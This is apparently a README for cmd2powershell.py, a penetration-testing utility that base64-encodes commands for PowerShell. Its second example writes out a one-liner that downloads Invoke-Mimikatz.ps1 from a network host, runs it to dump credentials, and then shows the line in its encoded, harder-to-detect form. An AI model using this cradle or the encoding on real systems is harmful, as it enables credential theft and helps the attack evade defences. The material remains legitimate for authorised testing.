cmd2powershell
==============

Converts a command to a base64 powershell compatible string
```
usage: cmd2powershell.py [-h] [-s] [command]

positional arguments:
  command      Command to encode

optional arguments:
  -h, --help   show this help message and exit
  -s, --stdin  Read from stdin
```

Example 1:

```
byt3bl33d3r@holeechit:~$ python cmd2powershell.py 'Get-PSDrives'
RwBlAHQALQBQAFMARAByAGkAdgBlAA==
```

Example 2:
```
byt3bl33d3r@holeechit:~$ cat command 
iex (New-Object Net.WebClient).DownloadString("http://192.168.10.6:80/Invoke-Mimikatz.ps1"); invoke-mimikatz

byt3bl33d3r@holeechit:~$ cat command | python cmd2powershell.py -s
aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAuADYAOgA4ADAALwBJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAuAHAAcwAxACIAKQA7ACAAaQBuAHYAbwBrAGUALQBtAGkAbQBpAGsAYQB0AHoACgA=
```
